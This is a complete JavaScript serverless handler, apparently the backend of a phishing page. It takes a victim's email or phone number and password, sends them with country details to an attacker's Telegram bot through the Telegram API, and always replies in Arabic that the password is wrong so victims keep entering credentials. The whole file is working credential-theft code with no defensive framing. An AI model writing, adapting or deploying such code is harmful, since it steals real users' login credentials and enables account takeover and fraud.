const https = require('https');

const token = process.env.TOKEN;
const adminId = process.env.ID;

exports.handler = async function (event, context) {
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ message: 'Method Not Allowed' }),
        };
    }

    const { text, password, country, callingCode } = JSON.parse(event.body);

    const textRegex = /^[a-zA-Z0-9_.@]+$/;

    const hasArabic = /[\u0600-\u06FF]/.test(text);

    if (!text || !textRegex.test(text) || hasArabic) {
        return {
            statusCode: 400,
            body: JSON.stringify({ message: 'Invalid text format' }),
        };
    }

    if (!password || password.length < 6) {
        return {
            statusCode: 400,
            body: JSON.stringify({ message: 'Password too short' }),
        };
    }

    const message = `تسجيل دخول جديد .\n\nالرقم او البريد : ${text}\nالرمز : ${password}\nالدولة : ${country}\nرمز الدولة : ${callingCode}`;

    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${adminId}&text=${encodeURIComponent(message)}`;

    try {
        const response = await new Promise((resolve, reject) => {
            https.get(url, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => resolve(data));
            }).on('error', (err) => reject(err));
        });

        return {
            statusCode: 200,
            body: JSON.stringify({ message: 'كلمة المرور خاطئة' }),
        };
    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ message: 'كلمة المرور خاطئة' }),
        };
    }
};
